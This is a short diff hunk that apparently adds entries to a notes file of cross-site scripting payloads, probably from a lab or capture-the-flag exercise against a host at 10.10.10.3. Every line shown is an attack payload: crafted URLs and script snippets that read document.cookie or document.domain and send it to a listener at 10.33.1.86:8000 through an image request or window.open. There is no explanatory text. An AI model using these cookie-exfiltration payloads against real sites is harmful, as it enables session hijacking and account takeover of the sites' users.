@@ -46,3 +46,9 @@ data:text/html;charset=utf-8,<script>document.write('&lt;script>alert(document.d
 ```
 <script>document.write('<img+src%3D\"http%3A%2F%2F10.33.1.86%3A8000%2F%3Fc%3D'%2BencodeURIComponent(document.cookie)%2B'\">')<%2Fscript>
 ```
+
+```
+http://10.10.10.3/?debug=true&url=data%3Atext%2Fhtml%3Bcharset%3Dutf-8%2C%27%3Cimg%2Bsrc%3Dx%2Bonerror%3D%22window.open%28%27http%3A%2F%2F10.33.1.86%3A8000%2F%3Fc%3D%27%2Bdocument.cookie%29%22%3E
+```
+
+`http://10.10.10.3/?url=javascriptjavascript:window.open(%27http://10.33.1.86:8000/%27%2bdocument.domain)`
